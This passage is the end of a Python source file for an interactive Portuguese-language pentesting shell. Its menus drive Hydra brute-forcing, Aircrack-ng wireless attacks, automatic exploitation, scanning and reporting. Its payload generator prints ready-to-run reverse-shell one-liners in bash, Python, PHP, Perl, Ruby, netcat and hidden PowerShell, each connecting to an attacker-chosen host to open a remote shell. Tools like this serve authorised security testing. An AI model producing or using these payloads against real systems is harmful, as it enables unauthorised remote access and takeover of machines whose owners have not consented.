            print(f"{Fore.RED}Erro na conversão para PDF: {e}{Style.RESET_ALL}")

# ============================================================================
# SHELL INTERATIVA PRINCIPAL
# ============================================================================

class PentestShell(cmd.Cmd):
    """Shell interativa do Pentest Suite Pro Max"""
    
    intro = f"""
{Fore.CYAN}{'='*80}
{'PENTEST SUITE PRO MAX v5.0.0':^80}
{'Sistema Completo de Pentesting Interativo':^80}
{'='*80}{Style.RESET_ALL}

{Fore.YELLOW}Digite 'help' para ver comandos disponíveis
Digite 'menu' para ver menu de módulos
Digite 'exit' para sair{Style.RESET_ALL}
"""
    
    prompt = f'{Fore.GREEN}pentest>{Style.RESET_ALL} '
    
    def __init__(self):
        super().__init__()
        
        # Inicializar sistemas
        self.deps = DependencyManager()
        self.hydra = AdvancedHydraManager()
        self.aircrack = CompleteAircrackSuite()
        self.exploit = AutoExploitationSystem()
        self.vuln = VulnerabilityAnalyzer()
        self.reports = ProfessionalReportingSystem()
        
        # Criar diretórios
        self._create_directories()
        
        # Verificar dependências
        self._check_dependencies()
    
    def _create_directories(self):
        """Criar diretórios necessários"""
        dirs = [
            Config.BASE_DIR, Config.TOOLS_DIR, Config.CONFIGS_DIR,
            Config.DATABASE_DIR, Config.LOGS_DIR, Config.TEMP_DIR,
            Config.SCANS_DIR, Config.CAPTURES_DIR, Config.ENCRYPTED_DIR,
            Config.WORDLISTS_DIR, Config.EXPLOITS_DIR, Config.REPORTS_DIR,
            Config.SESSIONS_DIR, Config.MODULES_DIR
        ]
        
        for directory in dirs:
            directory.mkdir(exist_ok=True, parents=True)
        
        print(f"{Fore.GREEN}Diretórios criados/verificados{Style.RESET_ALL}")
    
    def _check_dependencies(self):
        """Verificar dependências essenciais"""
        print(f"\n{Fore.YELLOW}Verificando dependências...{Style.RESET_ALL}")
        
        missing = self.deps.check_essential_dependencies()
        
        if missing:
            print(f"{Fore.RED}Dependências essenciais faltando:{Style.RESET_ALL}")
            for dep_type, dep in missing:
                print(f"  {dep_type}: {dep}")
            
            print(f"\n{Fore.YELLOW}Instalar automaticamente? (s/n): {Style.RESET_ALL}", end='')
            if input().strip().lower() == 's':
                self.deps.install_all_dependencies()
        else:
            print(f"{Fore.GREEN}✓ Todas dependências essenciais OK{Style.RESET_ALL}")
    
    def do_menu(self, arg):
        """Mostrar menu de módulos"""
        self._show_main_menu()
    
    def _show_main_menu(self):
        """Mostrar menu principal"""
        while True:
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"{'MENU PRINCIPAL':^80}")
            print(f"{'='*80}{Style.RESET_ALL}")
            
            print(f"\n{Fore.YELLOW}MÓDULOS PRINCIPAIS:{Style.RESET_ALL}")
            print("1.  Sistema Hydra Avançado")
            print("2.  Suite Aircrack-ng Completa")
            print("3.  Sistema de Exploração Automática")
            print("4.  Analisador de Vulnerabilidades")
            print("5.  Sistema de Relatórios Profissionais")
            print("6.  Gerenciador de Dependências")
            print("7.  Ferramentas Auxiliares")
            print("8.  Configurações do Sistema")
            print("9.  Sair para Shell")
            print("0.  Sair do Programa")
            
            choice = input(f"\n{Fore.GREEN}Selecione módulo [1-9, 0]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.hydra.interactive_attack()
            elif choice == '2':
                self.aircrack.main_menu()
            elif choice == '3':
                self.exploit.interactive_exploitation()
            elif choice == '4':
                self.vuln.scan_for_vulnerabilities()
            elif choice == '5':
                self.reports.generate_report()
            elif choice == '6':
                self._dependency_manager()
            elif choice == '7':
                self._auxiliary_tools()
            elif choice == '8':
                self._system_settings()
            elif choice == '9':
                break
            elif choice == '0':
                self.do_exit('')
                return
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _dependency_manager(self):
        """Gerenciador de dependências"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'GERENCIADOR DE DEPENDÊNCIAS':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.YELLOW}Opções:{Style.RESET_ALL}")
            print("1. Instalar todas as dependências")
            print("2. Instalar pacotes do sistema")
            print("3. Instalar pacotes Python")
            print("4. Criar wordlists personalizadas")
            print("5. Verificar dependências")
            print("6. Voltar")
            
            choice = input(f"\n{Fore.GREEN}Selecione opção [1-6]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.deps.install_all_dependencies()
            elif choice == '2':
                self._install_system_packages()
            elif choice == '3':
                self._install_python_packages()
            elif choice == '4':
                self.deps.create_wordlists()
            elif choice == '5':
                missing = self.deps.check_essential_dependencies()
                if missing:
                    print(f"{Fore.RED}Faltam dependências:{Style.RESET_ALL}")
                    for dep_type, dep in missing:
                        print(f"  {dep_type}: {dep}")
                else:
                    print(f"{Fore.GREEN}✓ Todas dependências OK{Style.RESET_ALL}")
            elif choice == '6':
                break
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _install_system_packages(self):
        """Instalar pacotes do sistema"""
        print(f"\n{Fore.YELLOW}Pacotes do sistema disponíveis:{Style.RESET_ALL}")
        
        packages = list(self.deps.DEPENDENCIES['system']['commands'].keys())
        
        for i, package in enumerate(packages, 1):
            print(f"{i}. {package}")
        
        choice = input(f"\n{Fore.GREEN}Selecione pacote (número ou 'todos'): {Style.RESET_ALL}").strip()
        
        if choice.lower() == 'todos':
            self.deps.install_all_dependencies(skip_system=False)
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(packages):
                self.deps.install_system_package(packages[idx])
        else:
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _install_python_packages(self):
        """Instalar pacotes Python"""
        print(f"\n{Fore.YELLOW}Pacotes Python disponíveis:{Style.RESET_ALL}")
        
        packages = list(self.deps.DEPENDENCIES['python'].keys())
        
        for i, package in enumerate(packages, 1):
            print(f"{i}. {package}")
        
        choice = input(f"\n{Fore.GREEN}Selecione pacote (número ou 'todos'): {Style.RESET_ALL}").strip()
        
        if choice.lower() == 'todos':
            for package in packages:
                self.deps.install_python_package(package)
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(packages):
                self.deps.install_python_package(packages[idx])
        else:
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _auxiliary_tools(self):
        """Ferramentas auxiliares"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'FERRAMENTAS AUXILIARES':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.YELLOW}Ferramentas:{Style.RESET_ALL}")
            print("1. Gerador de payloads")
            print("2. Codificador/Decodificador")
            print("3. Calculadora de rede")
            print("4. Hash calculator")
            print("5. Criptografia/Descriptografia")
            print("6. Analisador de arquivos")
            print("7. Voltar")
            
            choice = input(f"\n{Fore.GREEN}Selecione ferramenta [1-7]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self._payload_generator()
            elif choice == '2':
                self._encoder_decoder()
            elif choice == '3':
                self._network_calculator()
            elif choice == '4':
                self._hash_calculator()
            elif choice == '5':
                self._crypto_tool()
            elif choice == '6':
                self._file_analyzer()
            elif choice == '7':
                break
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _payload_generator(self):
        """Gerador de payloads"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'GERADOR DE PAYLOADS':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Tipos de payload:{Style.RESET_ALL}")
        print("1. Reverse Shell")
        print("2. Bind Shell")
        print("3. Web Shell")
        print("4. Meterpreter")
        print("5. Exploit development")
        
        choice = input(f"\n{Fore.GREEN}Selecione tipo [1-5]: {Style.RESET_ALL}").strip()
        
        if choice == '1':
            self._generate_reverse_shell()
        elif choice == '2':
            self._generate_bind_shell()
        elif choice == '3':
            self._generate_web_shell()
        elif choice == '4':
            self._generate_meterpreter()
        elif choice == '5':
            self._exploit_development()
    
    def _generate_reverse_shell(self):
        """Gerar reverse shell"""
        print(f"\n{Fore.YELLOW}Gerador de Reverse Shell{Style.RESET_ALL}")
        
        lhost = input(f"{Fore.GREEN}LHOST (seu IP): {Style.RESET_ALL}").strip()
        lport = input(f"{Fore.GREEN}LPORT (porta): {Style.RESET_ALL}").strip() or "4444"
        
        print(f"\n{Fore.CYAN}Reverse Shells disponíveis:{Style.RESET_ALL}")
        
        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'ncat': f"ncat {lhost} {lport} -e /bin/bash",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        for name, command in shells.items():
            print(f"\n{Fore.GREEN}{name}:{Style.RESET_ALL}")
            print(f"{command}")
    
    def _system_settings(self):
        """Configurações do sistema"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'CONFIGURAÇÕES DO SISTEMA':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        # Carregar configuração atual
        config = self._load_config()
        
        while True:
            print(f"\n{Fore.YELLOW}Configurações atuais:{Style.RESET_ALL}")
            
            for section, settings in config.items():
                print(f"\n{section.upper()}:")
                for key, value in settings.items():
                    print(f"  {key}: {value}")
            
            print(f"\n{Fore.YELLOW}Opções:{Style.RESET_ALL}")
            print("1. Editar configuração")
            print("2. Restaurar padrões")
            print("3. Salvar configuração")
            print("4. Backup do sistema")
            print("5. Restaurar backup")
            print("6. Voltar")
            
            choice = input(f"\n{Fore.GREEN}Selecione opção [1-6]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                config = self._edit_config(config)
            elif choice == '2':
                config = Config.DEFAULT_CONFIG.copy()
                print(f"{Fore.GREEN}Configurações restauradas para padrão{Style.RESET_ALL}")
            elif choice == '3':
                self._save_config(config)
            elif choice == '4':
                self._backup_system()
            elif choice == '5':
                self._restore_backup()
            elif choice == '6':
                break
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _load_config(self):
        """Carregar configuração"""
        if Config.CONFIG_FILE.exists():
            try:
                if YAML_AVAILABLE:
                    with open(Config.CONFIG_FILE, 'r') as f:
                        return yaml.safe_load(f)
                else:
                    with open(Config.CONFIG_FILE, 'r') as f:
                        return json.load(f)
            except:
                pass
        
        return Config.DEFAULT_CONFIG.copy()
    
    def _save_config(self, config):
        """Salvar configuração"""
        try:
            if YAML_AVAILABLE:
                with open(Config.CONFIG_FILE, 'w') as f:
                    yaml.dump(config, f, default_flow_style=False)
            else:
                with open(Config.CONFIG_FILE, 'w') as f:
                    json.dump(config, f, indent=2)
            
            print(f"{Fore.GREEN}Configuração salva em {Config.CONFIG_FILE}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Erro ao salvar configuração: {e}{Style.RESET_ALL}")
    
    def _edit_config(self, config):
        """Editar configuração"""
        print(f"\n{Fore.YELLOW}Seções disponíveis:{Style.RESET_ALL}")
        
        sections = list(config.keys())
        for i, section in enumerate(sections, 1):
            print(f"{i}. {section}")
        
        section_choice = input(f"\n{Fore.GREEN}Selecione seção [1-{len(sections)}]: {Style.RESET_ALL}").strip()
        
        if not section_choice.isdigit():
            return config
        
        idx = int(section_choice) - 1
        if not (0 <= idx < len(sections)):
            return config
        
        section = sections[idx]
        
        print(f"\n{Fore.YELLOW}Configurações em {section}:{Style.RESET_ALL}")
        
        settings = list(config[section].keys())
        for i, setting in enumerate(settings, 1):
            print(f"{i}. {setting}: {config[section][setting]}")
        
        setting_choice = input(f"\n{Fore.GREEN}Selecione configuração [1-{len(settings)}]: {Style.RESET_ALL}").strip()
        
        if not setting_choice.isdigit():
            return config
        
        idx2 = int(setting_choice) - 1
        if not (0 <= idx2 < len(settings)):
            return config
        
        setting = settings[idx2]
        current_value = config[section][setting]
        
        new_value = input(f"\n{Fore.GREEN}Novo valor para {setting} [atual: {current_value}]: {Style.RESET_ALL}").strip()
        
        if new_value:
            # Converter tipo se necessário
            if isinstance(current_value, bool):
                config[section][setting] = new_value.lower() in ['true', 'yes', 'y', '1']
            elif isinstance(current_value, int):
                try:
                    config[section][setting] = int(new_value)
                except:
                    print(f"{Fore.RED}Valor deve ser inteiro{Style.RESET_ALL}")
            elif isinstance(current_value, float):
                try:
                    config[section][setting] = float(new_value)
                except:
                    print(f"{Fore.RED}Valor deve ser número{Style.RESET_ALL}")
            else:
                config[section][setting] = new_value
        
        return config
    
    def _backup_system(self):
        """Fazer backup do sistema"""
        print(f"\n{Fore.YELLOW}Criando backup do sistema...{Style.RESET_ALL}")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        backup_file = Config.BASE_DIR.parent / f"pentest_suite_backup_{timestamp}.tar.gz"
        
        try:
            import tarfile
            
            with tarfile.open(backup_file, "w:gz") as tar:
                tar.add(Config.BASE_DIR, arcname=os.path.basename(Config.BASE_DIR))
            
            size = os.path.getsize(backup_file) / 1024 / 1024
            print(f"{Fore.GREEN}Backup criado: {backup_file} ({size:.2f} MB){Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Erro ao criar backup: {e}{Style.RESET_ALL}")
    
    def _restore_backup(self):
        """Restaurar backup"""
        print(f"\n{Fore.YELLOW}Restaurando backup...{Style.RESET_ALL}")
        
        # Listar backups
        backup_dir = Config.BASE_DIR.parent
        backups = list(backup_dir.glob("pentest_suite_backup_*.tar.gz"))
        
        if not backups:
            print(f"{Fore.RED}Nenhum backup encontrado!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Backups disponíveis:{Style.RESET_ALL}")
        for i, backup in enumerate(backups[-5:], 1):  # Últimos 5 backups
            size = os.path.getsize(backup) / 1024 / 1024
            date_str = backup.stem.replace('pentest_suite_backup_', '')
            try:
                date = datetime.strptime(date_str, '%Y%m%d_%H%M%S')
                print(f"{i}. {date.strftime('%Y-%m-%d %H:%M:%S')} ({size:.2f} MB)")
            except:
                print(f"{i}. {backup.name} ({size:.2f} MB)")
        
        choice = input(f"\n{Fore.GREEN}Selecione backup [1-{len(backups[-5:])}]: {Style.RESET_ALL}").strip()
        
        if not choice.isdigit():
            return
        
        idx = int(choice) - 1
        if not (0 <= idx < len(backups[-5:])):
            return
        
        backup_file = backups[-5:][idx]
        
        print(f"\n{Fore.RED}ATENÇÃO: Esta ação irá sobrescrever dados atuais!{Style.RESET_ALL}")
        confirm = input(f"{Fore.RED}Continuar? (s/n): {Style.RESET_ALL}").strip().lower()
        
        if confirm != 's':
            return
        
        try:
            import tarfile
            import shutil
            
            # Extrair backup
            with tarfile.open(backup_file, "r:gz") as tar:
                tar.extractall(backup_dir)
            
            print(f"{Fore.GREEN}Backup restaurado com sucesso!{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Erro ao restaurar backup: {e}{Style.RESET_ALL}")
    
    def do_help(self, arg):
        """Mostrar ajuda"""
        print(f"\n{Fore.YELLOW}Comandos disponíveis:{Style.RESET_ALL}")
        print("  menu           - Mostrar menu de módulos")
        print("  hydra          - Sistema Hydra avançado")
        print("  aircrack       - Suite Aircrack-ng completa")
        print("  exploit        - Sistema de exploração automática")
        print("  vuln           - Analisador de vulnerabilidades")
        print("  report         - Sistema de relatórios")
        print("  deps           - Gerenciador de dependências")
        print("  tools          - Ferramentas auxiliares")
        print("  config         - Configurações do sistema")
        print("  clear          - Limpar tela")
        print("  exit           - Sair do programa")
    
    def do_hydra(self, arg):
        """Abrir sistema Hydra"""
        self.hydra.interactive_attack()
    
    def do_aircrack(self, arg):
        """Abrir suite Aircrack"""
        self.aircrack.main_menu()
    
    def do_exploit(self, arg):
        """Abrir sistema de exploração"""
        self.exploit.interactive_exploitation()
    
    def do_vuln(self, arg):
        """Abrir analisador de vulnerabilidades"""
        self.vuln.scan_for_vulnerabilities()
    
    def do_report(self, arg):
        """Abrir sistema de relatórios"""
        self.reports.generate_report()
    
    def do_deps(self, arg):
        """Abrir gerenciador de dependências"""
        self._dependency_manager()
    
    def do_tools(self, arg):
        """Abrir ferramentas auxiliares"""
        self._auxiliary_tools()
    
    def do_config(self, arg):
        """Abrir configurações do sistema"""
        self._system_settings()
    
    def do_clear(self, arg):
        """Limpar tela"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def do_exit(self, arg):
        """Sair do programa"""
        print(f"\n{Fore.CYAN}Obrigado por usar Pentest Suite Pro Max!{Style.RESET_ALL}")
        return True
    
    def default(self, line):
        """Comando não reconhecido"""
        print(f"{Fore.RED}Comando não reconhecido: {line}{Style.RESET_ALL}")
        print("Digite 'help' para ver comandos disponíveis")
    
    def emptyline(self):
        """Não fazer nada em linha vazia"""
        pass

# ============================================================================
# FUNÇÃO PRINCIPAL
# ============================================================================

def main():
    """Função principal"""
    
    # CORREÇÃO: Criar o diretório de logs ANTES de configurar o logging
    try:
        # Garante que a pasta de logs e seus pais existam
        Config.LOGS_DIR.mkdir(parents=True, exist_ok=True)
    except PermissionError:
        print("Erro: Permissão negada ao criar diretório de logs.")
        print(f"Tentando criar em: {Config.LOGS_DIR}")
        print("Execute com 'sudo' se estiver tentando escrever em /root")
        return

    # Configurar logging (agora seguro, pois a pasta existe)
    try:
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(Config.LOG_FILE),
                logging.StreamHandler()
            ]
        )
    except Exception as e:
        print(f"Erro ao configurar logging: {e}")
        # Continua apenas com StreamHandler se o arquivo falhar
        logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler()])

    # Verificar se está rodando como root (Opcional, mas recomendado para ferramentas de pentest)
    if os.name == 'posix' and os.geteuid() != 0:
        if COLORAMA_AVAILABLE:
            print(f"{Fore.RED}Aviso: Algumas funcionalidades requerem privilégios de root!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Execute com sudo para acesso completo.{Style.RESET_ALL}")
        else:
            print("Aviso: Algumas funcionalidades requerem privilégios de root!")
            print("Execute com sudo para acesso completo.")

    try:
        # Iniciar shell
        shell = PentestShell()
        shell.cmdloop()
    except KeyboardInterrupt:
        print("\nSaindo...")
    except Exception as e:
        logging.error(f"Erro fatal: {e}")
        print(f"\nErro fatal ocorrido. Verifique os logs em {Config.LOG_FILE}")

if __name__ == "__main__":
    main()
